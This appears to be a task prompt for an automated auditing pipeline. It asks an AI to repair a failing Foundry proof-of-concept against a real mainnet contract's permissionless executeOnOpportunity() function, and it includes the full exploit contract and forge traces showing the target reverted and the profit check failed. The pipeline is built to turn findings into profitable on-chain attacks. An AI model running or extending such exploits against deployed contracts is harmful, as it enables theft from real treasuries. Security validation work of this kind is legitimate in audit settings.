You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Anyone can trigger the strategy against the verifier treasury
- claim: `executeOnOpportunity()` is `external` and completely permissionless even though it controls a prefunded treasury and decides when the contract will spend its own assets against external protocols.
- impact: Any third party can front-run the intended operator and consume or spoil a time-sensitive opportunity, forcing execution at an unfavorable moment and potentially leaving the bankroll and any resulting profit stranded in the contract earlier than intended.
- exploit_paths: ["Observe the verifier being funded", "Call `executeOnOpportunity()` before the intended operator does", "The contract executes the strategy using its own treasury with no caller authorization"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IAaveBoostTarget {
    function aave() external view returns (address);
    function executeOnOpportunity() external;
}

contract FlawVerifier {
    address public constant TARGET = 0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant DEFAULT_AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;

    string private constant STRICT_PATH =
        "Observe the verifier being funded -> Call executeOnOpportunity() before the intended operator does -> The contract executes the strategy using its own treasury with no caller authorization";

    bool public executed;
    bool public prefunded;
    bool public targetCallSucceeded;
    bool public treasuryWasSpent;
    bool public originalHypothesisValidated;

    address public observedAave;

    uint256 public targetEthBefore;
    uint256 public targetEthAfter;
    uint256 public targetWethBefore;
    uint256 public targetWethAfter;
    uint256 public targetAaveBefore;
    uint256 public targetAaveAfter;
    uint256 public targetUsdcBefore;
    uint256 public targetUsdcAfter;

    uint256 public attackerEthBefore;
    uint256 public attackerEthAfter;
    uint256 public attackerWethBefore;
    uint256 public attackerWethAfter;
    uint256 public attackerAaveBefore;
    uint256 public attackerAaveAfter;
    uint256 public attackerUsdcBefore;
    uint256 public attackerUsdcAfter;

    address private realizedProfitToken;
    uint256 private realizedProfitAmount;
    string private result;

    constructor() {
        observedAave = _readAave();
        realizedProfitToken = observedAave;
        result = "not-run";
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        observedAave = _readAave();
        _snapshotBefore();

        prefunded = _targetHasTreasury();
        if (!prefunded) {
            // Exploit path stage 1 fails concretely when the verifier treasury is not funded at the
            // fork block, because there is no bankroll for a third party to race against.
            result = "infeasible-stage-1-unfunded";
            return;
        }

        (targetCallSucceeded,) = TARGET.call(abi.encodeWithSelector(IAaveBoostTarget.executeOnOpportunity.selector));
        _snapshotAfter();

        if (!targetCallSucceeded) {
            // Exploit path stage 2 fails concretely when the live fork no longer satisfies the
            // target's strategy-side preconditions and the permissionless entrypoint reverts.
            _captureRealizedProfit();
            result = "infeasible-stage-2-target-reverted";
            return;
        }

        treasuryWasSpent = _targetEconomicStateChanged();
        originalHypothesisValidated = treasuryWasSpent;

        _captureRealizedProfit();

        if (!treasuryWasSpent) {
            // The entrypoint remained permissionless, but this fork did not produce an observable
            // treasury spend across the verifier's funded assets, so the reported impact is not
            // mechanically realized here.
            result = "infeasible-stage-3-no-observable-treasury-spend";
            return;
        }

        if (realizedProfitAmount > 0) {
            result = "validated-with-direct-profit";
            return;
        }

        // The reported issue is still validated if an arbitrary third party can force the verifier
        // to deploy its own treasury. This fork simply does not expose a direct withdrawal path for
        // the frontrunner, so profit remains stranded on the target side rather than reaching the
        // attacker contract.
        result = "validated-permissionless-trigger-no-direct-profit";
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function exploitPath() external pure returns (string memory) {
        return STRICT_PATH;
    }

    function outcome() external view returns (string memory) {
        return result;
    }

    function profitAchieved() external view returns (bool) {
        return realizedProfitAmount > 0;
    }

    function hypothesisValidated() external view returns (bool) {
        return originalHypothesisValidated;
    }

    function _snapshotBefore() internal {
        attackerEthBefore = address(this).balance;
        attackerWethBefore = _balanceOf(WETH, address(this));
        attackerAaveBefore = _balanceOf(observedAave, address(this));
        attackerUsdcBefore = _balanceOf(USDC, address(this));

        targetEthBefore = TARGET.balance;
        targetWethBefore = _balanceOf(WETH, TARGET);
        targetAaveBefore = _balanceOf(observedAave, TARGET);
        targetUsdcBefore = _balanceOf(USDC, TARGET);
    }

    function _snapshotAfter() internal {
        attackerEthAfter = address(this).balance;
        attackerWethAfter = _balanceOf(WETH, address(this));
        attackerAaveAfter = _balanceOf(observedAave, address(this));
        attackerUsdcAfter = _balanceOf(USDC, address(this));

        targetEthAfter = TARGET.balance;
        targetWethAfter = _balanceOf(WETH, TARGET);
        targetAaveAfter = _balanceOf(observedAave, TARGET);
        targetUsdcAfter = _balanceOf(USDC, TARGET);
    }

    function _targetHasTreasury() internal view returns (bool) {
        return targetEthBefore > 0 || targetWethBefore > 0 || targetAaveBefore > 0 || targetUsdcBefore > 0;
    }

    function _targetEconomicStateChanged() internal view returns (bool) {
        return targetEthAfter != targetEthBefore || targetWethAfter != targetWethBefore || targetAaveAfter != targetAaveBefore
            || targetUsdcAfter != targetUsdcBefore;
    }

    function _captureRealizedProfit() internal {
        uint256 ethGain = _positiveDelta(attackerEthAfter, attackerEthBefore);
        uint256 wethGain = _positiveDelta(attackerWethAfter, attackerWethBefore);
        uint256 aaveGain = _positiveDelta(attackerAaveAfter, attackerAaveBefore);
        uint256 usdcGain = _positiveDelta(attackerUsdcAfter, attackerUsdcBefore);

        realizedProfitToken = address(0);
        realizedProfitAmount = ethGain;

        _considerProfit(WETH, wethGain);
        _considerProfit(observedAave, aaveGain);
        _considerProfit(USDC, usdcGain);
    }

    function _considerProfit(address token, uint256 amount) internal {
        if (amount > realizedProfitAmount) {
            realizedProfitToken = token;
            realizedProfitAmount = amount;
        }
    }

    function _positiveDelta(uint256 afterAmount, uint256 beforeAmount) internal pure returns (uint256) {
        return afterAmount > beforeAmount ? afterAmount - beforeAmount : 0;
    }

    function _readAave() internal view returns (address token) {
        (bool ok, bytes memory data) = TARGET.staticcall(abi.encodeWithSelector(IAaveBoostTarget.aave.selector));
        if (ok && data.length >= 32) {
            token = abi.decode(data, (address));
        }
        if (token == address(0)) {
            token = DEFAULT_AAVE;
        }
    }

    function _balanceOf(address token, address owner) internal view returns (uint256 balance) {
        if (token == address(0)) {
            return 0;
        }

        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, owner));
        if (ok && data.length >= 32) {
            balance = abi.decode(data, (uint256));
        }
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
:
  [267655] FlawVerifierTest::testExploit()
    ├─ [2456] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9
    ├─ [9873] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   ├─ [2638] 0x5D4Aa78B08Bc7C530e21bf7447988b1Be7991322::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [2498] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [223993] FlawVerifier::executeOnOpportunity()
    │   ├─ [2326] 0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA::aave() [staticcall]
    │   │   └─ ← [Return] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9
    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1373] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [638] 0x5D4Aa78B08Bc7C530e21bf7447988b1Be7991322::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [9839] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [2553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [3373] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9::balanceOf(0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA) [staticcall]
    │   │   ├─ [2638] 0x5D4Aa78B08Bc7C530e21bf7447988b1Be7991322::balanceOf(0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA) [delegatecall]
    │   │   │   └─ ← [Return] 48948600000000000000 [4.894e19]
    │   │   └─ ← [Return] 48948600000000000000 [4.894e19]
    │   ├─ [3339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA) [staticcall]
    │   │   ├─ [2553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [193] 0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA::executeOnOpportunity()
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1373] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [638] 0x5D4Aa78B08Bc7C530e21bf7447988b1Be7991322::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1373] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9::balanceOf(0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA) [staticcall]
    │   │   ├─ [638] 0x5D4Aa78B08Bc7C530e21bf7447988b1Be7991322::balanceOf(0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA) [delegatecall]
    │   │   │   └─ ← [Return] 48948600000000000000 [4.894e19]
    │   │   └─ ← [Return] 48948600000000000000 [4.894e19]
    │   ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA) [staticcall]
    │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [456] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [498] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA.executeOnOpportunity
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.03s (2.77ms CPU time)

Ran 1 test suite in 1.20s (1.03s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 267655)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
